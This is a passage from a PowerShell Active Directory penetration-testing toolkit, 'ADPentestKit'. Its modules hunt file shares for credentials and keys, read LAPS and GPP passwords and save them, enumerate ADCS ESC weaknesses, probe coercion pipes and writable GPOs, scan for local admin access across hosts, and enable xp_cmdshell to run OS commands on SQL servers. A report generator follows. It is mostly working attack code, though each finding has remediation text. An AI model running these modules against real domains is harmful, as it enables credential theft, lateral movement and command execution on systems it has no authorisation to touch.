        Write-Host "`n  $($readableShares.Count) readable non-default shares found" -ForegroundColor Green
    }
}

# ============================================================
# MODULE 9: Credential Search in Shares
# ============================================================
function Invoke-CredentialSearch {
    Write-Host "`n[Module 9] Credential Search in Shares" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $shareFile = Join-Path $OutputDir "readable_shares.txt"
    if (-not (Test-Path $shareFile)) {
        Write-Host "  Run Module 8 (Share Hunt) first to discover shares" -ForegroundColor Yellow
        return
    }
    $shares = Get-Content $shareFile

    $credPatterns = 'password|pwd=|connectionString|data source|user id|credential|secret|aws_access|aws_secret|private.key|BEGIN RSA|BEGIN OPENSSH'
    $credFiles = '*.config,*.xml,*.ini,*.json,*.sql,*.ps1,*.bat,*.cmd,*.txt,*.py,*.cfg,*.conf,*.properties,*.env,*.yaml,*.yml,*.pem,*.key,*.pfx,*.p12'

    foreach ($share in $shares) {
        Write-Host "  Searching: $share" -ForegroundColor Gray
        Get-ChildItem $share -Recurse -Include ($credFiles -split ',') -Depth 4 -ErrorAction SilentlyContinue | ForEach-Object {
            $hits = Select-String -Path $_.FullName -Pattern $credPatterns -ErrorAction SilentlyContinue
            if ($hits) {
                Write-Host "  [HIT] $($_.FullName)" -ForegroundColor Red
                $detail = ($hits | Select-Object -First 5 | ForEach-Object {
                    "Line $($_.LineNumber): $($_.Line.Trim().Substring(0, [Math]::Min($_.Line.Trim().Length, 150)))"
                }) -join "`n"
                Write-Host "    $detail" -ForegroundColor Yellow

                $severity = if ($_.FullName -match 'web\.config|appsettings|connectionstring') { "Critical" }
                           elseif ($_.FullName -match '\.pem|\.key|\.pfx|aws') { "Critical" }
                           else { "High" }

                Add-Finding -Module "CredSearch" -Severity $severity `
                    -Title "Credentials Found: $($_.Name)" `
                    -Detail "Path: $($_.FullName)`n$detail" `
                    -Remediation "Remove credentials from shares, use secrets management (vault, gMSA, etc.)"
            }
        }

        # Also look for SSH keys, certificates, and sensitive files by name
        Get-ChildItem $share -Recurse -Include "id_rsa","id_ed25519","*.pem","*.pfx","*.p12","*.cer","*.key","*.kdbx","*.keystore","unattend.xml","sysprep.xml","*.rdp","*.pgpass","credentials*","*password*" -Depth 4 -ErrorAction SilentlyContinue | ForEach-Object {
            Write-Host "  [SENSITIVE FILE] $($_.FullName)" -ForegroundColor Red
            Add-Finding -Module "CredSearch" -Severity "High" `
                -Title "Sensitive File on Share: $($_.Name)" `
                -Detail "Path: $($_.FullName) | Size: $($_.Length) bytes" `
                -Remediation "Remove sensitive files from accessible shares"
        }
    }
}

# ============================================================
# MODULE 10: LAPS Check
# ============================================================
function Invoke-LAPSCheck {
    Write-Host "`n[Module 10] LAPS Password Readability Check" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $searcher = Get-LDAPSearcher -Filter "(objectClass=computer)" `
        -Properties @("dNSHostName","ms-Mcs-AdmPwd","ms-Mcs-AdmPwdExpirationTime","msLAPS-Password","msLAPS-EncryptedPassword")
    $searcher.PageSize = 500

    $readable = @()
    $searcher.FindAll() | ForEach-Object {
        $name = $_.Properties["dnshostname"] | Select-Object -First 1
        $legacyPwd = $_.Properties["ms-mcs-admpwd"] | Select-Object -First 1
        $newPwd = $_.Properties["mslaps-password"] | Select-Object -First 1

        if ($legacyPwd -and $legacyPwd.ToString().Trim()) {
            $readable += "$name (Legacy LAPS): $legacyPwd"
            Write-Host "  [LAPS READ] $name - Password: $legacyPwd" -ForegroundColor Red
        }
        if ($newPwd -and $newPwd.ToString().Trim()) {
            $readable += "$name (Windows LAPS): $newPwd"
            Write-Host "  [LAPS READ] $name - Windows LAPS password readable" -ForegroundColor Red
        }
    }

    if ($readable.Count -gt 0) {
        Add-Finding -Module "LAPS" -Severity "Critical" `
            -Title "LAPS Passwords Readable ($($readable.Count) systems)" `
            -Detail ($readable | Select-Object -First 10 | Out-String) `
            -Remediation "Restrict LAPS password read permissions to designated admin groups only"
        $readable | Out-File (Join-Path $OutputDir "laps_passwords.txt") -Encoding ASCII
    } else {
        Write-Host "  No readable LAPS passwords found" -ForegroundColor Gray
    }
}

# ============================================================
# MODULE 11: ADCS Enumeration (ESC1-ESC8)
# ============================================================
function Invoke-ADCSEnum {
    Write-Host "`n[Module 11] ADCS Vulnerability Check" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $configDN = ([ADSI]"LDAP://RootDSE").configurationNamingContext.ToString()

    # Check if CA exists
    $esSrc = Get-LDAPSearcher -Filter "(objectClass=pKIEnrollmentService)" `
        -SearchRoot "CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN" `
        -Properties @("cn","dNSHostName","certificateTemplates")
    $cas = $esSrc.FindAll()

    if ($cas.Count -eq 0) {
        Write-Host "  No Certificate Authority found in domain" -ForegroundColor Gray
        Add-Finding -Module "ADCS" -Severity "Info" -Title "No ADCS CA deployed" -Detail "No enrollment services found"
        return
    }

    foreach ($ca in $cas) {
        $caName = $ca.Properties["cn"] | Select-Object -First 1
        $caHost = $ca.Properties["dnshostname"] | Select-Object -First 1
        Write-Host "  CA: $caName on $caHost" -ForegroundColor Cyan

        # ESC7: CA ACL check
        try {
            $caEntry = $ca.GetDirectoryEntry()
            $caAcl = $caEntry.ObjectSecurity
            foreach ($ace in $caAcl.Access) {
                $p = $ace.IdentityReference.ToString()
                $rights = $ace.ActiveDirectoryRights.ToString()
                if ($p -match 'Authenticated Users|Domain Users|Everyone' -and
                    $rights -match 'GenericAll|WriteDacl|WriteOwner') {
                    Write-Host "  [ESC7] $p has $rights on CA!" -ForegroundColor Red
                    Add-Finding -Module "ADCS" -Severity "Critical" -Title "ESC7: CA ACL Misconfiguration" `
                        -Detail "$p has $rights on $caName" -Remediation "Restrict CA ACL permissions"
                }
            }
        } catch { }

        # ESC8: HTTP enrollment
        foreach ($proto in @("http","https")) {
            try {
                $resp = Invoke-WebRequest -Uri "$proto`://$caHost/certsrv/" -UseDefaultCredentials -TimeoutSec 3 -UseBasicParsing
                Write-Host "  [ESC8] $proto`://$caHost/certsrv/ - Web enrollment ACTIVE!" -ForegroundColor Red
                Add-Finding -Module "ADCS" -Severity "High" -Title "ESC8: HTTP Web Enrollment on $caHost" `
                    -Detail "NTLM relay to $proto`://$caHost/certsrv/ possible" `
                    -Remediation "Disable HTTP enrollment or enforce EPA/HTTPS only"
            } catch {
                if ($_.Exception.Response.StatusCode.value__ -eq 401) {
                    Write-Host "  [ESC8] $proto`://$caHost/certsrv/ - 401 (exists)" -ForegroundColor Yellow
                }
            }
        }
    }

    # Template checks
    $tplSearcher = Get-LDAPSearcher -Filter "(objectClass=pKICertificateTemplate)" `
        -SearchRoot "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configDN" `
        -Properties @("name","msPKI-Certificate-Name-Flag","pKIExtendedKeyUsage","msPKI-Template-Schema-Version")
    $tplSearcher.PageSize = 100

    foreach ($t in $tplSearcher.FindAll()) {
        $tName = $t.Properties["name"] | Select-Object -First 1
        $nameFlag = [int]($t.Properties["mspki-certificate-name-flag"] | Select-Object -First 1)
        $eku = @($t.Properties["pkiextendedkeyusage"])
        $schemaVer = [int]($t.Properties["mspki-template-schema-version"] | Select-Object -First 1)

        $entry = $t.GetDirectoryEntry()
        $acl = try { $entry.ObjectSecurity } catch { $null }
        $enrollable = $false
        $writable = @()

        if ($acl) {
            foreach ($ace in $acl.Access) {
                $p = $ace.IdentityReference.ToString()
                $rights = $ace.ActiveDirectoryRights.ToString()
                if ($p -match 'Authenticated Users|Domain Users|Everyone|Domain Computers') {
                    if ($rights -match 'ExtendedRight|GenericAll') { $enrollable = $true }
                    if ($rights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty') {
                        $writable += "$p"
                    }
                }
            }
        }

        # ESC1
        if (($nameFlag -band 1) -and $enrollable) {
            Write-Host "  [ESC1] $tName - Enrollee supplies subject + enrollable" -ForegroundColor Red
            Add-Finding -Module "ADCS" -Severity "Critical" -Title "ESC1: $tName" `
                -Detail "ENROLLEE_SUPPLIES_SUBJECT flag set and enrollable by low-priv users" `
                -Remediation "Remove ENROLLEE_SUPPLIES_SUBJECT flag or restrict enrollment"
        }

        # ESC2
        $noEku = ($eku.Count -eq 0)
        $anyPurpose = $eku -contains '2.5.29.37.0'
        if ($enrollable -and ($noEku -or $anyPurpose)) {
            Write-Host "  [ESC2] $tName - Any Purpose/No EKU + enrollable" -ForegroundColor Red
            Add-Finding -Module "ADCS" -Severity "High" -Title "ESC2: $tName" `
                -Detail "Template has no EKU restriction and is enrollable" `
                -Remediation "Add specific EKU restrictions to template"
        }

        # ESC3
        if ($eku -contains '1.3.6.1.4.1.311.20.2.1' -and $enrollable) {
            Write-Host "  [ESC3] $tName - Certificate Request Agent + enrollable" -ForegroundColor Yellow
            Add-Finding -Module "ADCS" -Severity "High" -Title "ESC3: $tName" `
                -Detail "Certificate Request Agent EKU with low-priv enrollment" `
                -Remediation "Restrict enrollment to authorized users only"
        }

        # ESC4
        if ($writable.Count -gt 0) {
            Write-Host "  [ESC4] $tName - Writable by: $($writable -join ', ')" -ForegroundColor Red
            Add-Finding -Module "ADCS" -Severity "Critical" -Title "ESC4: $tName writable" `
                -Detail "Low-priv users can modify template: $($writable -join ', ')" `
                -Remediation "Remove write permissions for low-privileged groups"
        }
    }
}

# ============================================================
# MODULE 12: GPP Password Search
# ============================================================
function Invoke-GPPSearch {
    Write-Host "`n[Module 12] GPP Password Search" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext.ToString()
    $domain = $domainDN -replace 'DC=','' -replace ',','.'
    $sysvolPath = "\\$domain\SYSVOL\$domain\Policies"

    $gppFiles = Get-ChildItem $sysvolPath -Recurse -Include "Groups.xml","Services.xml","Scheduledtasks.xml",
        "DataSources.xml","Printers.xml","Drives.xml","Registry.xml" -ErrorAction SilentlyContinue

    foreach ($file in $gppFiles) {
        $content = Get-Content $file.FullName -Raw
        if ($content -match 'cpassword="([^"]+)"') {
            $cpass = $Matches[1]
            if ($cpass.Length -gt 0) {
                Write-Host "  [CRIT] Found cpassword in $($file.FullName)" -ForegroundColor Red
                Write-Host "    cpassword: $cpass" -ForegroundColor Yellow
                Add-Finding -Module "GPPPassword" -Severity "Critical" `
                    -Title "GPP Password Found: $($file.Name)" `
                    -Detail "File: $($file.FullName)`ncpassword: $cpass" `
                    -Remediation "Delete GPP XML files containing cpassword from SYSVOL. Rotate affected passwords."
            }
        }
    }

    if ($gppFiles.Count -eq 0) {
        Write-Host "  No GPP XML files found" -ForegroundColor Gray
    } else {
        Write-Host "  Checked $($gppFiles.Count) GPP files" -ForegroundColor Gray
    }
}

# ============================================================
# MODULE 13: Service Account Analysis
# ============================================================
function Invoke-ServiceAccountAnalysis {
    Write-Host "`n[Module 13] Service Account Analysis" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $searcher = Get-LDAPSearcher `
        -Filter "(&(objectClass=user)(servicePrincipalName=*)(!(samAccountName=krbtgt)))" `
        -Properties @("sAMAccountName","servicePrincipalName","pwdLastSet","userAccountControl",
                      "memberOf","description","lastLogon")

    $results = $searcher.FindAll()
    Write-Host "  Found $($results.Count) service accounts (with SPNs)" -ForegroundColor Cyan

    foreach ($r in $results) {
        $sam = $r.Properties["samaccountname"] | Select-Object -First 1
        $uac = [int]($r.Properties["useraccountcontrol"] | Select-Object -First 1)
        $disabled = ($uac -band 2) -ne 0
        $pwdNotExpire = ($uac -band 65536) -ne 0
        $desOnly = ($uac -band 2097152) -ne 0
        $pwdSet = try { [DateTime]::FromFileTimeUtc([Int64]($r.Properties["pwdlastset"] | Select-Object -First 1)) } catch { $null }
        $pwdAge = if ($pwdSet) { ((Get-Date) - $pwdSet).Days } else { "Unknown" }
        $spns = @($r.Properties["serviceprincipalname"])
        $groups = @($r.Properties["memberof"]) | ForEach-Object { ($_ -split ',')[0] -replace '^CN=','' }

        if ($disabled) { continue }

        $flags = @()
        if ($pwdNotExpire) { $flags += "PwdNeverExpires" }
        if ($desOnly) { $flags += "DES-Only" }
        if ($pwdAge -is [int] -and $pwdAge -gt 365) { $flags += "StalePwd(${pwdAge}d)" }
        if ($groups -match 'Admin|Domain') { $flags += "PRIVILEGED" }

        $color = if ($flags -match 'PRIVILEGED') { 'Red' } elseif ($flags.Count -gt 0) { 'Yellow' } else { 'White' }
        Write-Host "  $sam | PwdAge: $pwdAge`d | Flags: $($flags -join ', ') | SPNs: $($spns.Count)" -ForegroundColor $color
    }
}

# ============================================================
# MODULE 14: Machine Account Quota
# ============================================================
function Invoke-MAQCheck {
    Write-Host "`n[Module 14] Machine Account Quota" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext.ToString()
    $domObj = [ADSI]"LDAP://$domainDN"
    $maq = $domObj.Properties["ms-DS-MachineAccountQuota"].Value

    Write-Host "  ms-DS-MachineAccountQuota: $maq" -ForegroundColor $(if ($maq -gt 0) { 'Yellow' } else { 'Green' })

    if ($maq -gt 0) {
        Add-Finding -Module "MAQ" -Severity "Medium" `
            -Title "Machine Account Quota: $maq" `
            -Detail "Users can create up to $maq computer accounts (enables RBCD attacks)" `
            -Remediation "Set ms-DS-MachineAccountQuota to 0"
    }
}

# ============================================================
# MODULE 15: Spooler / WebDAV / Pipe Check
# ============================================================
function Invoke-CoercionCheck {
    Write-Host "`n[Module 15] Authentication Coercion Check" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $targets = @()
    $srvSearcher = Get-LDAPSearcher `
        -Filter "(&(objectClass=computer)(operatingSystem=*Server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" `
        -Properties @("dNSHostName")
    $srvSearcher.FindAll() | ForEach-Object {
        $name = $_.Properties["dnshostname"] | Select-Object -First 1
        if ($name) { $targets += $name }
    }

    Write-Host "  Checking $($targets.Count) servers..." -ForegroundColor Gray

    foreach ($srv in $targets) {
        # Spooler
        try {
            $pipe = "\\$srv\pipe\spoolss"
            [System.IO.File]::Open($pipe, 'Open', 'Read', 'ReadWrite').Close()
            Write-Host "  [SPOOLER] $srv - OPEN" -ForegroundColor Yellow
            Add-Finding -Module "Coercion" -Severity "Medium" -Title "Print Spooler Active: $srv" `
                -Detail "SpoolSample/PrinterBug coercion possible" `
                -Remediation "Disable Print Spooler on servers where printing is not needed"
        } catch {
            if ($_.Exception -match 'Access|Unauthorized') {
                Write-Host "  [SPOOLER] $srv - Running (access denied)" -ForegroundColor Yellow
            }
        }

        # Named pipes (EFS/PetitPotam)
        foreach ($pipeName in @("efsrpc","lsarpc")) {
            try {
                [System.IO.File]::Open("\\$srv\pipe\$pipeName", 'Open', 'Read', 'ReadWrite').Close()
                Write-Host "  [PIPE] $srv\pipe\$pipeName - OPEN" -ForegroundColor Yellow
            } catch {
                if ($_.Exception -match 'Access|Unauthorized') {
                    Write-Host "  [PIPE] $srv\pipe\$pipeName - Exists" -ForegroundColor DarkYellow
                }
            }
        }

        # WebDAV
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $tcp.Connect($srv, 80)
            Write-Host "  [HTTP] $srv - Port 80 OPEN" -ForegroundColor Yellow
            $tcp.Close()
        } catch { }
    }
}

# ============================================================
# MODULE 16: GPO Permission Check
# ============================================================
function Invoke-GPOCheck {
    Write-Host "`n[Module 16] GPO Write Permission Check" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $gpoSearcher = Get-LDAPSearcher -Filter "(objectClass=groupPolicyContainer)" `
        -Properties @("displayName","gPCFileSysPath")
    $gpoSearcher.PageSize = 100

    $gpoSearcher.FindAll() | ForEach-Object {
        $gpoName = $_.Properties["displayname"] | Select-Object -First 1
        $gpoPath = $_.Properties["gpcfilesyspath"] | Select-Object -First 1
        if ($gpoPath) {
            try {
                $testFile = "$gpoPath\test_$([guid]::NewGuid().ToString('N').Substring(0,8)).tmp"
                [System.IO.File]::WriteAllText($testFile, "x")
                Remove-Item $testFile -Force
                Write-Host "  [VULN] $gpoName - WRITABLE!" -ForegroundColor Red
                Add-Finding -Module "GPO" -Severity "Critical" `
                    -Title "Writable GPO: $gpoName" `
                    -Detail "Path: $gpoPath" `
                    -Remediation "Restrict GPO write permissions to authorized administrators only"
            } catch { }
        }
    }
    Write-Host "  GPO check complete" -ForegroundColor Gray
}

# ============================================================
# MODULE 17: Local Privilege Escalation Check
# ============================================================
function Invoke-LocalPrivescCheck {
    Write-Host "`n[Module 17] Local Privilege Escalation Check" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    # Token privileges
    Write-Host "`n  Token Privileges:" -ForegroundColor Cyan
    $privs = whoami /priv 2>$null | Select-String "Enabled"
    foreach ($p in $privs) {
        Write-Host "    $($p.Line.Trim())" -ForegroundColor Yellow
    }

    $dangerousPrivs = @('SeImpersonatePrivilege','SeAssignPrimaryTokenPrivilege','SeDebugPrivilege',
                        'SeBackupPrivilege','SeRestorePrivilege','SeTakeOwnershipPrivilege','SeLoadDriverPrivilege')
    foreach ($dp in $dangerousPrivs) {
        if ($privs -match $dp) {
            Add-Finding -Module "LocalPrivesc" -Severity "High" `
                -Title "Dangerous Token Privilege: $dp" `
                -Detail "Current user has $dp enabled" `
                -Remediation "Review token privilege assignments"
        }
    }

    # Unquoted service paths
    Write-Host "`n  Unquoted Service Paths:" -ForegroundColor Cyan
    Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
        $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match '\s' -and
        $_.PathName -notmatch 'System32|system32|sysWOW64' -and $_.StartMode -ne 'Disabled'
    } | ForEach-Object {
        Write-Host "    [VULN] $($_.Name) - $($_.PathName)" -ForegroundColor Yellow
        Add-Finding -Module "LocalPrivesc" -Severity "Medium" `
            -Title "Unquoted Service Path: $($_.Name)" `
            -Detail "Path: $($_.PathName) | StartMode: $($_.StartMode)" `
            -Remediation "Quote the service binary path"
    }

    # AlwaysInstallElevated
    Write-Host "`n  AlwaysInstallElevated:" -ForegroundColor Cyan
    $aie1 = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $aie2 = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    if ($aie1 -eq 1 -and $aie2 -eq 1) {
        Write-Host "    [VULN] AlwaysInstallElevated is ON!" -ForegroundColor Red
        Add-Finding -Module "LocalPrivesc" -Severity "Critical" `
            -Title "AlwaysInstallElevated Enabled" `
            -Detail "Both HKLM and HKCU AlwaysInstallElevated are set to 1" `
            -Remediation "Disable AlwaysInstallElevated via GPO"
    } else {
        Write-Host "    Not vulnerable" -ForegroundColor Gray
    }

    # Cached credentials
    Write-Host "`n  Cached Credentials:" -ForegroundColor Cyan
    $cached = cmdkey /list 2>$null | Select-String "Target:|User:"
    foreach ($c in $cached) { Write-Host "    $($c.Line.Trim())" -ForegroundColor Yellow }
}

# ============================================================
# MODULE 18: SQL Exploitation
# ============================================================
function Invoke-SQLExploit {
    Write-Host "`n[Module 18] SQL Server Exploitation" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    if (-not $SqlServer -or -not $SqlUser -or -not $SqlPass) {
        Write-Host "  Specify -SqlServer, -SqlUser, -SqlPass to use this module" -ForegroundColor Yellow
        return
    }

    try {
        $conn = New-Object System.Data.SqlClient.SqlConnection
        $conn.ConnectionString = "Server=$SqlServer;User ID=$SqlUser;Password=$SqlPass;Connection Timeout=5"
        $conn.Open()
        Write-Host "  [+] Connected to $SqlServer as $SqlUser" -ForegroundColor Green

        # Check sysadmin
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSA, SYSTEM_USER AS LoginName"
        $reader = $cmd.ExecuteReader()
        $isSA = $false
        while ($reader.Read()) {
            $isSA = $reader['IsSA'] -eq 1
            Write-Host "  Login: $($reader['LoginName']) | sysadmin: $isSA" -ForegroundColor $(if ($isSA) { 'Red' } else { 'White' })
        }
        $reader.Close()

        if ($isSA) {
            Add-Finding -Module "SQL" -Severity "Critical" `
                -Title "SQL Sysadmin: $SqlUser on $SqlServer" `
                -Detail "Full SQL server control. Check xp_cmdshell for OS command execution." `
                -Remediation "Apply least privilege to SQL logins"

            # Enable and test xp_cmdshell
            $cmd2 = $conn.CreateCommand()
            $cmd2.CommandText = "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
            try { $cmd2.ExecuteNonQuery() | Out-Null } catch { }

            $cmd3 = $conn.CreateCommand()
            if ($SqlCommand) {
                $cmd3.CommandText = "EXEC xp_cmdshell '$($SqlCommand -replace "'","''")'"
            } else {
                $cmd3.CommandText = "EXEC xp_cmdshell 'whoami /all'"
            }
            $reader3 = $cmd3.ExecuteReader()
            Write-Host "`n  xp_cmdshell output:" -ForegroundColor Cyan
            while ($reader3.Read()) {
                $line = $reader3[0]
                if ($line) { Write-Host "    $line" }
            }
            $reader3.Close()
        }

        # List databases
        Write-Host "`n  Databases:" -ForegroundColor Cyan
        $cmd4 = $conn.CreateCommand()
        $cmd4.CommandText = "SELECT name, state_desc FROM sys.databases"
        $reader4 = $cmd4.ExecuteReader()
        while ($reader4.Read()) { Write-Host "    $($reader4['name']) ($($reader4['state_desc']))" }
        $reader4.Close()

        $conn.Close()
    } catch {
        Write-Host "  [-] Connection failed: $($_.Exception.InnerException.Message)" -ForegroundColor Red
    }
}

# ============================================================
# MODULE 19: Admin Access Scan
# ============================================================
function Invoke-AdminScan {
    Write-Host "`n[Module 19] Admin Access Scan" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $targets = @()
    $compSearcher = Get-LDAPSearcher -Filter "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" `
        -Properties @("dNSHostName")
    $compSearcher.FindAll() | ForEach-Object {
        $name = $_.Properties["dnshostname"] | Select-Object -First 1
        if ($name) { $targets += $name }
    }

    Write-Host "  Testing admin access on $($targets.Count) hosts..." -ForegroundColor Gray
    $adminHosts = @()

    foreach ($t in $targets) {
        try {
            $null = Get-ChildItem "\\$t\C$" -ErrorAction Stop | Select-Object -First 1
            $adminHosts += $t
            Write-Host "  [ADMIN] $t" -ForegroundColor Red
        } catch { }
    }

    if ($adminHosts.Count -gt 0) {
        Add-Finding -Module "AdminAccess" -Severity "High" `
            -Title "Local Admin Access on $($adminHosts.Count) hosts" `
            -Detail ($adminHosts -join ', ') `
            -Remediation "Review local administrator group membership"
        $adminHosts | Out-File (Join-Path $OutputDir "admin_access.txt") -Encoding ASCII
    }
    Write-Host "`n  Admin access: $($adminHosts.Count) / $($targets.Count) hosts" -ForegroundColor Cyan
}

# ============================================================
# REPORT GENERATOR
# ============================================================
function Export-Report {
    Write-Host "`n[*] Generating Report..." -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $endTime = Get-Date
    $duration = $endTime - $script:StartTime

    # JSON report
    $report = [PSCustomObject]@{
        ToolVersion  = "ADPentestKit v1.0"
        StartTime    = $script:StartTime.ToString('yyyy-MM-dd HH:mm:ss')
        EndTime      = $endTime.ToString('yyyy-MM-dd HH:mm:ss')
        Duration     = $duration.ToString()
        Operator     = "$env:USERDOMAIN\$env:USERNAME"
        Hostname     = $env:COMPUTERNAME
        TotalFindings = $script:Findings.Count
        Critical     = @($script:Findings | Where-Object { $_.Severity -eq 'Critical' }).Count
        High         = @($script:Findings | Where-Object { $_.Severity -eq 'High' }).Count
        Medium       = @($script:Findings | Where-Object { $_.Severity -eq 'Medium' }).Count
        Low          = @($script:Findings | Where-Object { $_.Severity -eq 'Low' }).Count
        Info         = @($script:Findings | Where-Object { $_.Severity -eq 'Info' }).Count
        Findings     = $script:Findings
    }

    $jsonPath = Join-Path $OutputDir "report.json"
    $report | ConvertTo-Json -Depth 5 | Out-File $jsonPath -Encoding UTF8

    # HTML report
    $htmlPath = Join-Path $OutputDir "report.html"
    $critCount = $report.Critical
    $highCount = $report.High
    $medCount = $report.Medium

    $findingsHtml = ""
    foreach ($f in ($script:Findings | Sort-Object @{Expression={
        switch ($_.Severity) { 'Critical'{0}; 'High'{1}; 'Medium'{2}; 'Low'{3}; 'Info'{4} }
    }})) {
        $sevColor = switch ($f.Severity) {
            'Critical' { '#dc3545' }; 'High' { '#fd7e14' }; 'Medium' { '#ffc107' }
            'Low' { '#17a2b8' }; 'Info' { '#6c757d' }
        }
        $detailEscaped = [System.Net.WebUtility]::HtmlEncode($f.Detail) -replace "`n","<br>"
        $remEscaped = [System.Net.WebUtility]::HtmlEncode($f.Remediation)
        $findingsHtml += @"
<tr>
<td><span style="background:$sevColor;color:white;padding:2px 8px;border-radius:3px;font-size:12px;">$($f.Severity)</span></td>
<td><strong>$([System.Net.WebUtility]::HtmlEncode($f.Title))</strong></td>
<td>$([System.Net.WebUtility]::HtmlEncode($f.Module))</td>
<td style="font-size:13px;">$detailEscaped</td>
<td style="font-size:13px;">$remEscaped</td>
</tr>
"@
    }

    $html = @"
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>AD Pentest Report</title>
<style>
body{font-family:Segoe UI,Arial,sans-serif;margin:20px;background:#1a1a2e;color:#e0e0e0;}
h1{color:#00d4ff;} h2{color:#7ec8e3;border-bottom:1px solid #333;padding-bottom:5px;}
table{border-collapse:collapse;width:100%;margin:10px 0;}
th{background:#16213e;color:#00d4ff;padding:10px;text-align:left;border:1px solid #333;}
td{padding:8px;border:1px solid #333;vertical-align:top;}
tr:hover{background:#16213e;}
.stats{display:flex;gap:15px;margin:15px 0;}
.stat{padding:15px 25px;border-radius:8px;text-align:center;min-width:100px;}
.stat .num{font-size:28px;font-weight:bold;}
.stat .label{font-size:12px;opacity:0.8;}
.crit{background:#dc3545;} .high{background:#fd7e14;} .med{background:#ffc107;color:#000;} .low{background:#17a2b8;}
</style></head><body>
<h1>AD Penetration Test Report</h1>
<p>Generated: $($endTime.ToString('yyyy-MM-dd HH:mm:ss')) | Duration: $($duration.ToString()) | Operator: $env:USERDOMAIN\$env:USERNAME</p>
<div class="stats">
<div class="stat crit"><div class="num">$critCount</div><div class="label">Critical</div></div>
<div class="stat high"><div class="num">$highCount</div><div class="label">High</div></div>
<div class="stat med"><div class="num">$medCount</div><div class="label">Medium</div></div>
<div class="stat low"><div class="num">$($report.Low)</div><div class="label">Low</div></div>
</div>
<h2>Findings ($($script:Findings.Count) total)</h2>
<table><tr><th>Severity</th><th>Finding</th><th>Module</th><th>Details</th><th>Remediation</th></tr>
$findingsHtml
</table></body></html>
"@
    $html | Out-File $htmlPath -Encoding UTF8

    # CSV
    $csvPath = Join-Path $OutputDir "findings.csv"
    $script:Findings | Export-Csv $csvPath -NoTypeInformation

    Write-Host "`n  Reports saved to:" -ForegroundColor Green
    Write-Host "    HTML: $htmlPath" -ForegroundColor White
    Write-Host "    JSON: $jsonPath" -ForegroundColor White
    Write-Host "    CSV:  $csvPath" -ForegroundColor White

    # Summary
    Write-Host "`n  ╔════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "  ║   FINDINGS SUMMARY         ║" -ForegroundColor Cyan
    Write-Host "  ╠════════════════════════════╣" -ForegroundColor Cyan
    Write-Host "  ║ Critical: $critCount                  ║" -ForegroundColor Red
    Write-Host "  ║ High:     $highCount                  ║" -ForegroundColor Yellow
    Write-Host "  ║ Medium:   $medCount                  ║" -ForegroundColor DarkYellow
    Write-Host "  ║ Low:      $($report.Low)                  ║" -ForegroundColor White
    Write-Host "  ║ Info:     $($report.Info)                  ║" -ForegroundColor Gray
    Write-Host "  ╚════════════════════════════╝" -ForegroundColor Cyan
}

# ============================================================
# MAIN EXECUTION
# ============================================================
Write-Banner
Ensure-OutputDir

$moduleMap = @{
    1  = { Invoke-DomainEnum }
    2  = { Invoke-UserEnum }
    3  = { Invoke-Kerberoast }
    4  = { Invoke-ASREPCheck }
    5  = { Invoke-DelegationCheck }
    6  = { Invoke-SMBSigningScan }
    7  = { Invoke-OSInventory }
    8  = { Invoke-ShareHunt }
    9  = { Invoke-CredentialSearch }
    10 = { Invoke-LAPSCheck }
    11 = { Invoke-ADCSEnum }
    12 = { Invoke-GPPSearch }
    13 = { Invoke-ServiceAccountAnalysis }
    14 = { Invoke-MAQCheck }
    15 = { Invoke-CoercionCheck }
    16 = { Invoke-GPOCheck }
    17 = { Invoke-LocalPrivescCheck }
    18 = { Invoke-SQLExploit }
    19 = { Invoke-AdminScan }
}

if ($Modules -eq "All") {
    $selectedModules = 1..19
} else {
    $selectedModules = $Modules -split ',' | ForEach-Object { [int]$_.Trim() }
}

foreach ($mod in $selectedModules) {
    if ($moduleMap.ContainsKey($mod)) {
        try {
            & $moduleMap[$mod]
        } catch {
            Write-Host "  [ERROR] Module $mod failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    } else {
        Write-Host "  [WARN] Unknown module: $mod" -ForegroundColor Yellow
    }
}

Export-Report

Write-Host "`n[*] AD Pentest Kit completed in $((Get-Date) - $script:StartTime)" -ForegroundColor Green
Write-Host "[*] Results saved to: $OutputDir" -ForegroundColor Green
